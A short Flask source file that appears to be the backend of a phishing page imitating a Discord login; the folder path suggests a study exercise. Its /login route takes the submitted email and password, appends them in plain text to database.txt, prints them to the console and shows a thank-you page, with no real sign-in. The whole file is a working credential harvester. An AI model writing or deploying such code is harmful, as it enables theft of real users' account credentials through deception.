from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    write_data(email, password)
    print("Email: " + email)
    print("Passord: " + password)

    return render_template('thankyou.html')

def write_data(email, password):

    file = open('\Study Material\Discord_Login\static\database.txt', 'a+')
    
    file.write(email + ', ' + password + '\n')  # Write the data to the file

    file.close()
    return

if __name__ == '__main__':
    app.run(debug=True)